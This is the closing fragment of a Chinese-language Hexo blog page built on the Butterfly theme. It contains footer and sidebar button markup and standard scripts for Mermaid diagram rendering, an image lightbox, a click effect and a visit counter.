href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = (ele) => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from(ele).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return
    
    codeMermaidEle.forEach(ele => {
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
  }
  
  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>